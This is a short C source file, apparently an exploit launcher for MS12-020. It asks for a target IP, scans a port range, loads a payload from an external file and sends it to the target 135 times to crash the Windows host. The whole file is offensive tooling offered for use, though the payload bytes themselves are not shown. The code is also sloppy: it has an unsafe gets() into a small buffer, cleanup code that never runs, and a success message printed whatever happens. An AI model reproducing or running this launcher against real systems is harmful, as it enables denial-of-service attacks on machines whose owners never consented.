/*
	Author : Evaison
	Weakness : MS12-020(BlueScreenOfDeath)
	Principle : IP & Port --> TCP/IP(+PortScan) --> ShellCode Send --> Exploit!!
	Ver 2.0 : Port Scanner(include)
*/
#include <stdio.h>
#include <stdlib.h>
#include <conio.h>
#include "Access.h"
#include "PortScan.h"

int Init(char*,int,int);
char *ShellCode();
int size = 0;

int main()
{
	char IP_Address[15];
	int Port = 0;
	int startPort = 0, endPort = 0;

	Port = Init(IP_Address,startPort,endPort);

	for (int i = 0; i < 135; i++) {
		Send_SCode(ShellCode(), IP_Address, Port, size);
		printf("Exploit %d Execution ********\n", i);
	}

	printf("Success Exploit!!\n");
	getch();
}

int Init(char *IP_Address, int startPort, int endPort)
{
	printf("*******************************************************************************\n");
	printf("********************\t Evasion Exploit\t*******************************\n");
	printf("********************  0x45 0x76 0x61 0x73 0x69 0x6f 0x6e <Evasion>  ***********\n");
	printf("*******************************************************************************\n");

	printf("ATTACK IP : ");
	gets(IP_Address);
	//포트 검사 시작 start ~ end

	WSADATA wsa;
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
		return -1;
	
	printf("Start Port : ");
	scanf("%d", &startPort);
	printf("End Port : ");
	scanf("%d", &endPort);

	int Check = 0;

	for (int i = startPort; i <= endPort; i++)
	{
		Check = portscan(IP_Address, i);
		printf("Port Checking..\n");
	}
	return Check;
	WSACleanup();
}

char *ShellCode()
{
	// Example : C:\exploit-toolkit\MS12-020
	FILE* fp = fopen("MS_Weakness의 절대 경로 입력", "rb");
	fseek(fp, 0, SEEK_END);
	size = ftell(fp);
	fseek(fp, 0, SEEK_SET);
	char* ShellCode = (char*)calloc(size, sizeof(char));
	fread(ShellCode, sizeof(char), size, fp);
	return ShellCode;
}